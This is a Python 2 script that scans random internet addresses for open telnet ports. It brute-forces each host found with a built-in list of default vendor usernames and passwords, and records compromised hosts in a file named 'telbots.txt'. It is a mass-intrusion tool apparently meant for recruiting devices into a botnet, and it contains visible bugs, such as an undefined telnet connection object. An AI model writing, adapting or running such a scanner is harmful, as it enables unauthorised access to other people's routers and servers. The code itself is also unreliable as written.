import threading
import telnetlib
import sys
import socket
import random
import thread
import time
threads = str(sys.argv[1])
print ("Telnet scanning")
def bruteForce(ip):
        dict={"Administrator":"admin","|Administrator":"changeme","cisco":"cisco","admin":"admin","|admin":"diamond","||admin":"cisco","root":"Cisco","|root":"password","||root":"blender","|||root":"attack","bbsd-client":"changeme2","cmaker":"cmaker","cusadmin":"password","hsa":"hsadb","netrangr":"attack","wlse":"wlsedb","wlseuser":"wlseuser"}
        for key,value in dict.iteritems():
                key = key.replace("|" , "")
                try:
                        #print " Trying User:",key,"  Password:",value ,"     on " , ip
                        tn.read_until((":" or ">" or "$" or "@"))
                        tn.write(key + "\n")
                        tn.read_until((":" or ">" or "$" or "@"))
                        tn.write(value + "\n")
                        tn.write("dir\n")
                        tn.write("exit\n")
                        tn.read_all()#we can print this to get the banner
                        print "\t\nLogin successful:", key , " -> " , value
                        fileopn =open('telbots.txt', 'a')
                        fileopn.write(ip + '|' + key + '' + value + '\n')
                        fileopn.close()
                        tn.close()
                        sys.exit(1)
                except Exception ,e:
                        #print ip , " --> " , e
                        pass
                finally:
                        try:
                                tn.close()
                        except Exception , e:
                                pass
 
        #randy()
 
def randy():
        a=random.randint(1,254)
        b=random.randint(1,254)
        c=random.randint(1,254)
        d=random.randint(1,254)
        ip=str(a) + "." +str(b) + "." +str(c) + "." +str(d)
        try:
            telnetlib.Telnet(ip , 23 , 2)
            print "Telnet: " , ip
            ipf=open('telnetservers.txt', 'a')
            ipf.write(ip +  '\n')
            ipf.close()
            bruteForce(ip)
        except Exception ,e:
            #print ip," => does not have telnet enabled" , e
            randy()
count = 0           
for threads in range(0, int(threads)):
#for threads in range(0,200):
        #thread.start_new_thread(randy,())
        #time.sleep(0.1)
	try:
		count = count + 1
		t = threading.Thread(target=randy)
		t.start()
	except:
		print('Could not start thread: ' + str(count))
print('Threads started: ' + str(count))

 
